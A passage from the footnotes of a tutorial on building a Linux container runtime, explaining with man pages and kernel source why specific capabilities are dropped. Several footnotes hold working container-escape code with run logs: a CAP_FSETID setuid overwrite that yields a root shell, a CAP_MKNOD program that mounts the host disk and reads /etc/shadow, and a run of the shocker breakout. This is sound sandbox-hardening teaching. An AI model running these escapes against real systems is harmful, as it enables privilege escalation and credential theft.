=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.Esog3p...done.
=&gt; trying a user namespace...writing /proc/994/uid_map...writing /proc/994/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
execve failed! Operation not permitted.
=&gt; cleaning cgroups...done.
</pre>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 28: </span><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a></label><pre class="src src-text">   Safety checking for capability-dumb binaries
	A  capability-dumb binary  is an  application that  has been
	marked to have file capabilities, but has not been converted
	to  use the  libcap(3) API  to manipulate  its capabilities.
	(In  other words,  this  is  a traditional  set-user-ID-root
	program that has been switched to use file capabilities, but
	whose   code   has   not   been   modified   to   understand
	capabilities.)    For  such   applications,  the   effective
	capability  bit  is  set  on  the file,  so  that  the  file
	permitted  capabilities  are  automatically enabled  in  the
	process effective  set when executing the  file.  The kernel
	recognizes a file which has the effective capability bit set
	as capability-dumb  for the  purpose of the  check described
	here.

	When executing  a capability-dumb binary, the  kernel checks
	if the process obtained all permitted capabilities that were
	specified in  the file  permitted set, after  the capability
	transformations described  above have been  performed.  (The
	typical  reason  why  this  might  not  occur  is  that  the
	capability bounding set masked  out some of the capabilities
	in the file  permitted set.)  If the process  did not obtain
	the full set of  file permitted capabilities, then execve(2)
	fails with the error EPERM.  This prevents possible security
	risks that could arise when a capability-dumb application is
	executed with less  privilege that it needs.   Note that, by
	definition, the application could  not itself recognize this
	problem, since it does not employ the libcap(3) API.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.12" class="footnum" href="#fnr.12">12</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 30: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/audit.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n663"><code>kernel/audit.c:663@c8d2bc</code></a></label><pre class="src src-C">switch (msg_type) {
case AUDIT_LIST:
case AUDIT_ADD:
case AUDIT_DEL:
	return -EOPNOTSUPP;
case AUDIT_GET:
case AUDIT_SET:
case AUDIT_GET_FEATURE:
case AUDIT_SET_FEATURE:
case AUDIT_LIST_RULES:
case AUDIT_ADD_RULE:
case AUDIT_DEL_RULE:
case AUDIT_SIGNAL_INFO:
case AUDIT_TTY_GET:
case AUDIT_TTY_SET:
case AUDIT_TRIM:
case AUDIT_MAKE_EQUIV:
	/* Only support auditd and auditctl in initial pid namespace
	 * for now. */
	if (task_active_pid_ns(current) != &amp;init_pid_ns)
		return -EPERM;

	if (!netlink_capable(skb, CAP_AUDIT_CONTROL))
		err = -EPERM;
	break;
case AUDIT_USER:
case AUDIT_FIRST_USER_MSG ... AUDIT_LAST_USER_MSG:
case AUDIT_FIRST_USER_MSG2 ... AUDIT_LAST_USER_MSG2:
	if (!netlink_capable(skb, CAP_AUDIT_WRITE))
		err = -EPERM;
	break;
default:  /* bad msg */
	err = -EINVAL;
}

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.13" class="footnum" href="#fnr.13">13</a></sup> <div class="footpara"><p class="footpara">
You can obtain an audit system file descriptor by calling
</p>
<pre class="example">
socket(AF_NETLINK, SOCK_DGRAM, NETLINK_AUDIT)

</pre>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 31: </span><a href="http://man7.org/linux/man-pages/man7/netlink.7.html"><code>man 7 netlink</code></a></label><pre class="src src-text">NETLINK(7) -- 2016-07-17 -- Linux -- Linux Programmer's Manual

NAME
	netlink  -  communication  between  kernel  and  user  space
	(AF_NETLINK)
SYNOPSIS
	[...]
	netlink_socket = socket(AF_NETLINK, socket_type, netlink_family);
	[...]
DESCRIPTION
	Netlink is  used to transfer information  between the kernel
	and  user-space  processes.   It   consists  of  a  standard
	sockets-based  interface for  user  space  processes and  an
	internal kernel API for kernel modules.
	[...]
	netlink_family selects the kernel module or netlink group to
	communicate with.   The currently assigned  netlink families
	are:
	[...]
	NETLINK_AUDIT (since Linux 2.6.6)
		Auditing.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.14" class="footnum" href="#fnr.14">14</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 33: </span><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a></label><pre class="src src-text">	CAP_BLOCK_SUSPEND (since Linux 3.5)
		Employ features that can block system suspend (epoll(7)
		EPOLLWAKEUP, /proc/sys/wake_lock).

</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.15" class="footnum" href="#fnr.15">15</a></sup> <div class="footpara"><p class="footpara">
<a href="http://www.openwall.com/lists/oss-security/2014/06/18/4">An email and description by Sebastian Krahmer</a>
</p>

<blockquote>
<p>
In 0.11 the problem is that the apps that run in the container have
CAP_DAC_READ_SEARCH and CAP_DAC_OVERRIDE which allows the containered
app to access files not just by pathname (which would be impossible
due to the bind mount of the rootfs) but also by handles via
open_by_handle_at(). Handles are mostly 64bit values and can be kind
of pre-computed as they are inode-based and the inode of / is 2.  So
you can go ahead and walk / by passing a handle of 2 and search the FS
until you find the inode# of the file you want to access. Even though
you are containered somewhere in /var/lib.
</p>
</blockquote>

<p class="footpara">
which links to the code, <a href="http://stealth.openwall.net/xSports/shocker.c"><code>shocker.c</code></a>.
</p>

<p class="footpara">
Note that, if usernamespaces are on, we're not vulnerable, since
<code>open_by_handle_at</code> checks for <code>CAP_DAC_READ_SEARCH</code> in the root namespace:
</p>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capdacreadsearch -m . -u 0 -c ./shocker
=&gt; validating Linux version...4.7.10.201610222037-1-grsec on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.GSmTxw...done.
=&gt; trying a user namespace...writing /proc/1538/uid_map...writing /proc/1538/gid_map...done.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

&lt;enter&gt;

[*] Resolving 'etc/shadow'
[-] open_by_handle_at: Operation not permitted
=&gt; cleaning cgroups...done.
</pre>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 35: </span><code>fs/fhandle.c:166</code></label><pre class="src src-C">static int handle_to_path(int mountdirfd, struct file_handle __user *ufh,
		   struct path *path)
{
	int retval = 0;
	struct file_handle f_handle;
	struct file_handle *handle = NULL;

	/*
	 * With handle we don't look at the execute bit on the
	 * the directory. Ideally we would like CAP_DAC_SEARCH.
	 * But we don't have that
	 */
	if (!capable(CAP_DAC_READ_SEARCH)) {
		retval = -EPERM;
		goto out_err;
	}
	/* ... */
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.16" class="footnum" href="#fnr.16">16</a></sup> <div class="footpara"><p class="footpara">
The setuid executable we'll subvert:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 37: </span><code>harmless_setuid.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror harmless_setuid.c -o harmless_setuid" -*- */
#define _GNU_SOURCE
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main (int argc, char **argv)
{
	uid_t a, b, c = 0;
	getresuid(&amp;a, &amp;b, &amp;c);
	printf("I'm #%d/%d/%d\n", a, b, c);
	return 0;
}
</pre>
</div>

<p class="footpara">
This program will write itself to the executable at <code>argv[1]</code>. If it's
a setuid root executable, there's no user namespace, and <code>CAP_FSETID</code>
isn't dropped, it'll retain setuid root.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 38: </span><code>cap_fsetid.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static cap_fsetid.c -o cap_fsetid" -*- */
#define _GNU_SOURCE
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;

int main (int argc, char **argv)
{
	if (argc == 2) {
		/* write our contents to the setuid file. */
		int setuid_file = 0;
		int own_file = 0;
		if ((setuid_file = open(argv[1], O_WRONLY | O_TRUNC)) == -1
		    || (own_file = open(argv[0], O_RDONLY)) == -1) {
			fprintf(stderr, "++ open failed: %m\n");
			return 1;
		}
		errno = 0;
		char here = 0;
		while (read(own_file, &amp;here, 1) &gt; 0
		       &amp;&amp; write(setuid_file, &amp;here, 1) &gt; 0);;
		if (errno) {
			fprintf(stderr, "++ reading/writing: %m\n");
			close(setuid_file);
			close(own_file);
		}
		close(own_file);
		close(setuid_file);
	} else {
		if (setresuid(0, 0, 0)) {
			fprintf(stderr, "++ failed switching uids to root: %m\n");
			return 1;
		}
		execve("/bin/sh", (char *[]) { "sh", 0 }, NULL);
	}
	return 0;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 39: </span><code>allow_capfsetid.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..17e7373 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -34,7 +34,6 @@ int capabilities()
 		CAP_AUDIT_WRITE,
 		CAP_BLOCK_SUSPEND,
 		CAP_DAC_READ_SEARCH,
-		CAP_FSETID,
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ make -B harmless_setuid
cc -Wall -Werror -static harmless_setuid.c -o harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chown root harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chmod 4755 harmless_setuid
[lizzie@empress l-c-i-500-l]$ ./harmless_setuid
I'm #1000/0/0
[lizzie@empress l-c-i-500-l]$ sudo ./contained -m . -u 0 -c ./cap_fsetid harmless_setuid
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.qapCVs...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ ./harmless_setuid 
++ failed switching uids to root: Operation not permitted
[lizzie@empress l-c-i-500-l]$ make -B harmless_setuid
cc -Wall -Werror -static harmless_setuid.c -o harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chown root harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo chmod 4755 harmless_setuid
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capfsetid -m . -u 0 -c ./cap_fsetid harmless_setuid
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.4u1dNe...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ ls -lh ./harmless_setuid
-rwsr-xr-x 1 root lizzie 788K Oct 25 05:22 ./harmless_setuid
[lizzie@empress l-c-i-500-l]$ ./harmless_setuid
sh-4.3# whoami
root
sh-4.3# id
uid=0(root) gid=1000(lizzie) groups=1000(lizzie)
sh-4.3# exit
[lizzie@empress l-c-i-500-l]$ rm harmless_setuid
</pre></div></div>

<div class="footdef"><sup><a id="fn.17" class="footnum" href="#fnr.17">17</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 41: </span><a href="http://man7.org/linux/man-pages/man2/mlock.2.html"><code>man 2 mlock</code></a></label><pre class="src src-text">DESCRIPTION
	mlock(), mlock2(),  and mlockall() lock  part or all  of the
	calling process's virtual address space into RAM, preventing
	that memory from being paged to the swap area.

	munlock() and  munlockall() perform the  converse operation,
	unlocking  part  or all  of  the  calling process's  virtual
	address  space,  so  that  pages in  the  specified  virtual
	address range may once more to be swapped out if required by
	the kernel memory manager.

	Memory locking and unlocking are performed in units of whole
	pages.

ERRORS

	ENOMEM
		(Linux  2.6.9  and  later)  the caller  had  a  nonzero
		RLIMIT_MEMLOCK soft  resource limit, but tried  to lock
		more memory  than the  limit permitted.  This  limit is
		not   enforced    if   the   process    is   privileged
		(CAP_IPC_LOCK).

</pre>
</div>

<p class="footpara">
These functions are the only use of <code>CAP_IPC_LOCK</code>; the only mention
in the source is
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 42: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/mm/mlock.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n27"><code>mm/mlock.c:27@c8d2bc</code></a></label><pre class="src src-C">bool can_do_mlock(void)
{
	if (rlimit(RLIMIT_MEMLOCK) != 0)
		return true;
	if (capable(CAP_IPC_LOCK))
		return true;
	return false;
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.18" class="footnum" href="#fnr.18">18</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 45: </span><code>cap_mknod.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror -static cap_mknod.c -o cap_mknod" -*- */
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/mount.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/sysmacros.h&gt;
#define DEV "/disk"
#define MNT "/mnt"

int main (int argc, char **argv)
{
	if (argc != 4) return 1;
	int return_code = 0;
	int etc_shadow = 0;
	
	dev_t dev = makedev(atoi(argv[1]), atoi(argv[2]));
	if (mknod(DEV, S_IFBLK | S_IRUSR, dev)) {
		fprintf(stderr, "++ mknod failed: %m\n");
		return 1;
	}
	if (mkdir(MNT, S_IRUSR)
	    &amp;&amp; (errno != EEXIST)) {
		fprintf(stderr, "++ mkdir failed: %m\n");
		goto cleanup_error;
	}
	if (mount(DEV, MNT, argv[3], 0, NULL)) {
		fprintf(stderr, "++ mount failed: %m\n");
		goto cleanup_error;
	}
	if ((etc_shadow = open(MNT "/etc/shadow", O_RDONLY)) == -1) {
		fprintf(stderr, "++ opening /etc/shadow failed: %m\n");
		goto cleanup_error;
	}
	fprintf(stderr, "++ reading /etc/shadow:\n");
	char here = 0;
	errno = 0;
	while (read(etc_shadow, &amp;here, 1) &gt; 0)
		write(STDOUT_FILENO, &amp;here, 1);
	if (errno) {
		fprintf(stderr, "read loop failed! %m\n");
		goto cleanup_error;
	}
	goto cleanup;
cleanup_error:
	return_code = 1;
cleanup:
	if (etc_shadow) close(etc_shadow);
	umount(MNT);
	unlink(DEV);
	rmdir(MNT);
	return return_code;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 46: </span><code>allow_capmknod.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..985930e 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -38,10 +38,8 @@ int capabilities()
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
-		CAP_MKNOD,
 		CAP_SETFCAP,
 		CAP_SYSLOG,
-		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,
 		CAP_SYS_MODULE,
 		CAP_SYS_NICE,
</pre>
</div>

<p class="footpara">
Note that <code>CAP_SYS_ADMIN</code> doesn't need to be allowed for this to work,
it's just that <code>mount</code> is more convenient than reading the block
device in userspace.
</p>

<pre class="example">
[lizzie@empress l-c-i-500-l]$  sudo  ./contained -m . -u 0 -c cap_mknod 8 1 vfat
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.VTnW1G...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ mknod failed: Operation not permitted
=&gt; cleaning cgroups...done.
[lizzie@empress l-c-i-500-l]$ make contained.allow_capmknod
patch contained.c -i allow_capmknod.diff -o contained.allow_capmknod.c
patching file contained.allow_capmknod.c (read from contained.c)
Hunk #1 succeeded at 46 (offset 8 lines).
cc -Wall -Werror -lseccomp -lcap contained.allow_capmknod.c -o contained.allow_capmknod
rm contained.allow_capmknod.c
[lizzie@empress l-c-i-500-l]$  sudo  ./contained.allow_capmknod -m . -u 0 -c cap_mknod 8 1 vfat
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.fdbi8q...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ reading /etc/shadow:
[redacted]
=&gt; cleaning cgroups...done.
</pre></div></div>

<div class="footdef"><sup><a id="fn.19" class="footnum" href="#fnr.19">19</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 48: </span><code>setfcap_and_exec.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall -Werror setfcap_and_exec.c -o setfcap_and_exec  -static -lcap" -*- */
#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;linux/capability.h&gt;
#include &lt;sys/capability.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/types.h&gt;

int main (int argc, char  **argv)
{
	if (argc == 2 &amp;&amp; !strcmp(argv[1], "inner")) {
		cap_t self_caps = {0};
		if (!(self_caps = cap_get_proc())) {
			fprintf(stderr, "++ cap_get_proc failed: %m\n");
			return 1;
		}

		cap_flag_value_t cap_mknod_status = CAP_CLEAR;
		if (cap_get_flag(self_caps, CAP_MKNOD, CAP_PERMITTED, &amp;cap_mknod_status)) {
			fprintf(stderr, "++ cap_get_flag failed: %m\n");
			cap_free(self_caps);
			return 1;
		}
		if (cap_mknod_status == CAP_CLEAR)
			fprintf(stderr, "!! don't have cap_mknod+p?\n");

		if (cap_set_flag(self_caps, CAP_EFFECTIVE, 1,
				 &amp; (cap_value_t) { CAP_MKNOD }, CAP_SET)) {
			fprintf(stderr, "++ can't cap_set_flag: %m\n");
			cap_free(self_caps);
			return 1;
		}
		if (cap_set_proc(self_caps)) {
			fprintf(stderr, "++ can't cap_set_proc: %m\n");
			cap_free(self_caps);
			return 1;
		}
		cap_free(self_caps);
		fprintf(stderr, "++ have CAP_MKNOD!\n");
	} else {
		cap_t file_caps = {0};
		if (!(file_caps = cap_from_text("cap_mknod+p"))) {
			fprintf(stderr, "++ cap_from_text failed: %m\n");
			return 1;
		}
		if (cap_set_file(argv[0], file_caps)) {
			fprintf(stderr, "++ cap_set_file failed: %m\n");
			cap_free(file_caps);
			return 1;
		}
		cap_free(file_caps);

		if (execve(argv[0], (char  *[]){ argv[0], "inner", 0 }, NULL)) {
			fprintf(stderr, "++ execve failed: %m\n");
			return 1;
		}
	}
	return 0;
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 49: </span><code>allow_capsetfcap.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..0f3a4e2 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -39,7 +39,6 @@ int capabilities()
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
 		CAP_MKNOD,
-		CAP_SETFCAP,
 		CAP_SYSLOG,
 		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capsetfcap -m . -u 0 -c setfcap_and_exec
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.GCu2Ry...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
!! don't have cap_mknod+p?
++ can't cap_set_proc: Operation not permitted
=&gt; cleaning cgroups...done.
</pre>

<p class="footpara">
it <b>does</b> work if we don't restrict <code>CAP_MKNOD</code>, so it does seem like
processes aren't allowed to set capabilities on files that they don't have:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 50: </span><code>allow_capmknod_capsetfcap.diff</code></label><pre class="src src-diff">diff --git a/linux-containers-in-500-loc/contained.c b/linux-containers-in-500-loc/contained.c
index 501aff5..b458201 100644
--- a/linux-containers-in-500-loc/contained.c
+++ b/linux-containers-in-500-loc/contained.c
@@ -38,8 +38,6 @@ int capabilities()
 		CAP_IPC_LOCK,
 		CAP_MAC_ADMIN,
 		CAP_MAC_OVERRIDE,
-		CAP_MKNOD,
-		CAP_SETFCAP,
 		CAP_SYSLOG,
 		CAP_SYS_ADMIN,
 		CAP_SYS_BOOT,
</pre>
</div>

<pre class="example">
[lizzie@empress l-c-i-500-l]$ sudo ./contained.allow_capmknod_capsetfcap -m . -u 0 -c setfcap_and_exec
=&gt; validating Linux version...4.8.4-1-ARCH on x86_64.
=&gt; setting cgroups...memory...cpu...pids...blkio...done.
=&gt; setting rlimit...done.
=&gt; remounting everything with MS_PRIVATE...remounted.
=&gt; making a temp directory and a bind mount there...done.
=&gt; pivoting root...done.
=&gt; unmounting /oldroot.IZ1gDw...done.
=&gt; trying a user namespace...unsupported? continuing.
=&gt; switching to uid 0 / gid 0...done.
=&gt; dropping capabilities...bounding...inheritable...done.
=&gt; filtering syscalls...done.
++ have CAP_MKNOD!
=&gt; cleaning cgroups...done.
</pre>

<p class="footpara">
This disagrees with <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">Brad Spengler's note in False Boundaries and
Arbitrary Code Execution</a>
</p>

<blockquote>
<p>
CAP_SETFCAP: generic: can set full capabilities on a file, granting full capabilities upon exec
</p>
</blockquote>

<p class="footpara">
but that's 5 years old, so it may have changed.
</p></div></div>

<div class="footdef"><sup><a id="fn.20" class="footnum" href="#fnr.20">20</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 52: </span><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html"><code>man 7 capabilities</code></a></label><pre class="src src-text">	CAP_SYSLOG (since Linux 2.6.37)
		*  Perform   privileged   syslog(2)  operations.    See
		   syslog(2)  for   information  on   which  operations
		   require privilege.
		*  View kernel  addresses exposed  via /proc  and other
		   interfaces  when /proc/sys/kernel/kptr_restrict  has
		   the   value  1.    (See   the   discussion  of   the
		   kptr_restrict in proc(5).)
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 53: </span><a href="http://man7.org/linux/man-pages/man2/syslog.2.html"><code>man 2 syslog</code></a></label><pre class="src src-text">	SYSLOG_ACTION_READ (2)
		[...] Bytes read from the log disappear from the log
		buffer [...]

	SYSLOG_ACTION_READ_ALL (3)
		[...] The call reads the   last    len   bytes    from
		the    log   buffer (nondestructively) [...]

	SYSLOG_ACTION_READ_CLEAR (4) [...]

	SYSLOG_ACTION_CLEAR (5) [...]

	SYSLOG_ACTION_CONSOLE_OFF (6) [...]

	SYSLOG_ACTION_CONSOLE_ON (7) [...]

	SYSLOG_ACTION_CONSOLE_LEVEL (8) [...]

	SYSLOG_ACTION_SIZE_UNREAD (9) [...]

	SYSLOG_ACTION_SIZE_BUFFER (10) [...]

	All commands  except 3 and  10 require privilege.
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.21" class="footnum" href="#fnr.21">21</a></sup> <div class="footpara"><p class="footpara">
All of the uses of <code>CAP_SYS_BOOT</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 56: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/reboot.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n280"><code>kernel/reboot.c:280@c8d2bc</code></a>:</label><pre class="src src-C">SYSCALL_DEFINE4(reboot, int, magic1, int, magic2, unsigned int, cmd,
		void __user *, arg)
{
	struct pid_namespace *pid_ns = task_active_pid_ns(current);
	char buffer[256];
	int ret = 0;

	/* We only trust the superuser with rebooting the system. */
	if (!ns_capable(pid_ns-&gt;user_ns, CAP_SYS_BOOT))
		return -EPERM;

	[...]
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 57: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/kexec.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n187"><code>kernel/kexec.c:187@c8d2bc</code></a>:</label><pre class="src src-C">SYSCALL_DEFINE4(kexec_load, unsigned long, entry, unsigned long, nr_segments,
		struct kexec_segment __user *, segments, unsigned long, flags)
{
	int result;

	/* We only trust the superuser with rebooting the system. */
	if (!capable(CAP_SYS_BOOT) || kexec_load_disabled)
		return -EPERM;

	[...]
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 58: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/kexec_file.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n256"><code>kernel/kexec_file.c:256@c8d2bc</code></a>:</label><pre class="src src-C">SYSCALL_DEFINE5(kexec_file_load, int, kernel_fd, int, initrd_fd,
		unsigned long, cmdline_len, const char __user *, cmdline_ptr,
		unsigned long, flags)
{
	int ret = 0, i;
	struct kimage **dest_image, *image;

	/* We only trust the superuser with rebooting the system. */
	if (!capable(CAP_SYS_BOOT) || kexec_load_disabled)
		return -EPERM;
	[...]
}
</pre>
</div></div></div>

<div class="footdef"><sup><a id="fn.22" class="footnum" href="#fnr.22">22</a></sup> <div class="footpara"><div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 60: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/module.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n931"><code>kernel/module.c:931@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE2(delete_module, const char __user *, name_user,
		unsigned int, flags)
{
	struct module *mod;
	char name[MODULE_NAME_LEN];
	int ret, forced = 0;

	if (!capable(CAP_SYS_MODULE) || modules_disabled)
		return -EPERM;
	[...]
}
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 61: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/module.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n3468"><code>kernel/module.c:3468@c8d2bc</code></a></label><pre class="src src-C">static int may_init_module(void)
{
	if (!capable(CAP_SYS_MODULE) || modules_disabled)
		return -EPERM;

	return 0;
}

</pre>
</div>
<p class="footpara">
which is called by <code>init_module</code> and <code>finit_module</code>:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 62: </span><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/kernel/module.c?id=c8d2bc9bc39ebea8437fd974fdbc21847bb897a3#n3759"><code>kernel/module.c:3759@c8d2bc</code></a></label><pre class="src src-C">SYSCALL_DEFINE3(init_module, void __user *, umod,
		unsigned long, len, const char __user *, uargs)
{
	int err;
	struct load_info info = { };

	err = may_init_module();
	if (err)
		return err;

	pr_debug("init_module: umod=%p, len=%lu, uargs=%p\n",
	       umod, len, uargs);

	err = copy_module_from_user(umod, len, &amp;info);
	if (err)
		return err;

	return load_module(&amp;info, uargs, 0);
}

SYSCALL_DEFINE3(finit_module, int, fd, const char __user *, uargs, int, flags)
{
	struct load_info info = { };
	loff_t size;
	void *hdr;
	int err;

	err = may_init_module();
	if (err)
		return err;

	pr_debug("finit_module: fd=%d, uargs=%p, flags=%i\n", fd, uargs, flags);

